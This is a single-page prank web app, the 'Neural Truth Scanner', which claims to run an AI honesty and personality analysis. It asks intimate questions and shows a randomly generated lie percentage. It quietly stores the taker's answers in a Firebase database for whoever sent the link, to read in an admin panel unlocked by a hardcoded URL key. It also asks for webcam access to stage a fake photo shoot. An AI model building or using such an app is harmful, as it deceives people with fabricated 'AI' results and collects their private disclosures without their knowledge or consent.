<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Neural Truth Scanner</title>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui,Segoe UI,Arial;
  background:#05060a;
  color:#e8faff;
}
.hidden{display:none}

:root{
  --neon:#00f7ff;
  --pink:#ff3cac;
}

/* COMMON */
.btn{
  padding:16px 32px;
  border-radius:40px;
  border:none;
  background:linear-gradient(135deg,var(--neon),var(--pink));
  color:black;
  font-size:18px;
  font-weight:700;
  cursor:pointer;
  transition:.3s;
}
.btn:hover{transform:scale(1.08)}

.glass{
  background:rgba(255,255,255,.06);
  backdrop-filter:blur(14px);
  border:1px solid rgba(255,255,255,.15);
  border-radius:22px;
  padding:22px;
  box-shadow:0 0 40px rgba(0,247,255,.15);
}

/* START */
#start{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  text-align:center;
}
#start h1{
  font-size:2.6em;
  color:var(--neon);
  text-shadow:0 0 25px var(--neon);
}

/* QUIZ */
#quiz{max-width:720px;margin:auto;padding:20px}
.option{
  width:100%;
  margin:12px 0;
  padding:18px;
  border-radius:50px;
  background:rgba(0,247,255,.08);
  border:1px solid rgba(0,247,255,.3);
  color:white;
  font-size:18px;
  cursor:pointer;
  transition:.25s;
}
.option:hover{
  background:rgba(255,60,172,.3);
  transform:scale(1.04);
}
.progress{
  height:10px;
  background:#111;
  border-radius:10px;
  overflow:hidden;
  margin-top:18px;
}
.progress div{
  height:100%;
  width:0%;
  background:linear-gradient(90deg,var(--neon),var(--pink));
  transition:1s;
}

/* LOADER */
.spinner{
  width:70px;height:70px;
  border:6px solid #222;
  border-top:6px solid var(--neon);
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:30px auto;
}
@keyframes spin{100%{transform:rotate(360deg)}}

/* CAMERA */
#camera video{
  width:100%;
  border-radius:18px;
  border:2px solid var(--neon);
}
.flash{
  position:fixed;
  inset:0;
  background:white;
  opacity:.9;
  display:none;
  z-index:999;
}

/* ADMIN */
#admin{display:flex;height:100vh}
#left{
  width:35%;
  border-right:1px solid #222;
  overflow:auto;
}
#right{flex:1;padding:20px}
.card{
  padding:16px;
  border-bottom:1px solid #222;
  cursor:pointer;
}
.card:hover{background:#0e1630}
.card.active{
  background:linear-gradient(90deg,#0e1630,#05060a);
  box-shadow:inset 4px 0 var(--neon);
}
.badge{font-size:12px;color:var(--neon)}
.danger{
  margin-top:20px;
  padding:12px 26px;
  border:none;
  border-radius:30px;
  font-weight:700;
  cursor:pointer;
  background:linear-gradient(135deg,#ff0844,#ffb199);
}
</style>
</head>
<body>

<!-- START -->
<div id="start">
  <div class="glass">
    <h1>Neural Truth Scanner üß†</h1>
    <p>AI honesty & personality analysis</p>
    <button class="btn" onclick="startScan()">Start Scan</button>
  </div>
</div>

<!-- QUIZ -->
<div id="quiz" class="hidden glass">
  <h2 id="qNo"></h2>
  <p id="qText"></p>
  <div id="options"></div>
  <div class="progress"><div id="prog"></div></div>
</div>

<!-- LOADER -->
<div id="loader" class="hidden glass">
  <div class="spinner"></div>
  <p id="loadText">Initializing neural scan‚Ä¶</p>
</div>

<!-- RESULT -->
<div id="result" class="hidden glass">
  <h2>Scan Complete</h2>
  <p id="lie"></p>
  <p id="per"></p>
  <p id="vibe"></p>
  <button class="btn" onclick="cameraPrank()">Analyze Facial Expressions üòè</button>
</div>

<!-- CAMERA -->
<div id="camera" class="hidden glass">
  <video id="video" autoplay playsinline></video>
  <p id="camMsg"></p>
  <button id="closeCam" class="btn hidden" onclick="closeCamera()">Close</button>
</div>

<div id="flash" class="flash"></div>

<!-- ADMIN -->
<div id="admin" class="hidden">
  <div id="left"></div>
  <div id="right">
    <h2>Responses</h2>
    <div id="details">Select a name</div>
  </div>
</div>

<script>
/* FIREBASE */
firebase.initializeApp({
  apiKey:"AIzaSyAuLOmBQ3xKNcYN2rzOo-3gY3-2UqIIyWk",
  authDomain:"prankgame-6ad46.firebaseapp.com",
  projectId:"prankgame-6ad46"
});
const db=firebase.firestore();

/* PARAMS */
const params=new URLSearchParams(location.search);
const play=params.get("play");
const isAdmin=params.get("admin")==="K9xP7Q2LmZ";

/* QUESTIONS */
const Q=[
"Have you smiled at your phone and locked it fast?",
"Do you overthink conversations at night?",
"Have you said 'I'm fine' when you weren't?",
"Do you replay moments in your head?",
"Have you hidden feelings when asked directly?",
"Have you felt insecure around a friend?",
"Does your brain wake up at 2AM?",
"Do people know the real you?",
"Have you pretended not to care?",
"Are you lying right now? üòÖ"
];

let i=0,answers=[];

/* INIT */
window.onload=()=>{
  if(isAdmin){openAdmin();return;}
  document.getElementById("admin").remove();
  if(!play){alert("Invalid or expired link");}
};

/* START */
function startScan(){
  if(!play)return;
  start.classList.add("hidden");
  quiz.classList.remove("hidden");
  showQ();
}

/* QUIZ */
function showQ(){
  if(i>=Q.length){submit();return;}
  qNo.innerText=`Question ${i+1}/${Q.length}`;
  qText.innerText=Q[i];
  options.innerHTML="";
  ["YES","NO","MAYBE"].forEach(o=>{
    let b=document.createElement("button");
    b.className="option";
    b.innerText=o;
    b.onclick=()=>{
      answers.push({q:Q[i],a:o});
      i++;prog.style.width=(i/Q.length*100)+"%";
      showQ();
    };
    options.appendChild(b);
  });
}

/* SUBMIT */
function submit(){
  quiz.classList.add("hidden");
  loader.classList.remove("hidden");
  const steps=[
    "Analyzing honesty‚Ä¶",
    "Reading micro-patterns‚Ä¶",
    "Cross-checking lies‚Ä¶",
    "Finalizing report‚Ä¶"
  ];
  let s=0;
  const t=setInterval(()=>{
    loadText.innerText=steps[s++]||"Done";
    if(s>steps.length){
      clearInterval(t);
      finish();
    }
  },1200);
}

function finish(){
  loader.classList.add("hidden");
  result.classList.remove("hidden");
  const lieVal=Math.floor(Math.random()*20)+76;
  lie.innerText=`Lie Probability: ${lieVal}%`;
  per.innerText="Personality: Overthinking Strategist üß†";
  vibe.innerText="Vibe: Calm outside, chaos inside üòå";

  db.collection("links").doc(play).update({
    status:"used",
    answers,
    lie:lieVal,
    time:Date.now()
  });
}

/* CAMERA PRANK */
function cameraPrank(){
  result.classList.add("hidden");
  camera.classList.remove("hidden");
  camMsg.innerText="Watch your expressions üòè";

  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
    .then(s=>{
      video.srcObject=s;
      setTimeout(()=>shutter(0),1200);
    });
}

function shutter(n){
  if(n>=3){
    setTimeout(()=>{
      camMsg.innerText="Relax üòå No photo was taken. Just a prank üòÇ";
      closeCam.classList.remove("hidden");
    },1000);
    return;
  }
  flash.style.display="block";
  new Audio("https://assets.mixkit.co/sfx/preview/mixkit-camera-shutter-1131.mp3").play();
  setTimeout(()=>flash.style.display="none",180);
  setTimeout(()=>shutter(n+1),700);
}

function closeCamera(){
  camera.classList.add("hidden");
  result.classList.remove("hidden");
}

/* ADMIN */
function openAdmin(){
  start.remove();
  quiz.remove();
  loader.remove();
  result.remove();
  camera.remove();
  admin.classList.remove("hidden");

  db.collection("links").orderBy("time","desc").onSnapshot(snap=>{
    left.innerHTML="";
    snap.forEach(doc=>{
      const d=doc.data();
      const c=document.createElement("div");
      c.className="card";
      c.innerHTML=`<b>${doc.id}</b><br><span class="badge">${d.status||"new"}</span>`;
      c.onclick=()=>selectEntry(doc.id,d,c);
      left.appendChild(c);
    });
  });
}

function selectEntry(id,data,card){
  document.querySelectorAll(".card").forEach(c=>c.classList.remove("active"));
  card.classList.add("active");

  details.innerHTML=`
    <p><b>Lie %:</b> ${data.lie||"-"}</p>
    <p><b>Answers:</b><br>${(data.answers||[]).map(a=>a.q+" ‚Üí "+a.a).join("<br>")}</p>
    <button class="danger" onclick="deleteEntry('${id}')">Delete</button>
  `;
}

function deleteEntry(id){
  if(!confirm("Delete permanently?"))return;
  db.collection("links").doc(id).delete();
  details.innerText="Deleted ‚úîÔ∏è";
}
</script>
</body>
</html>
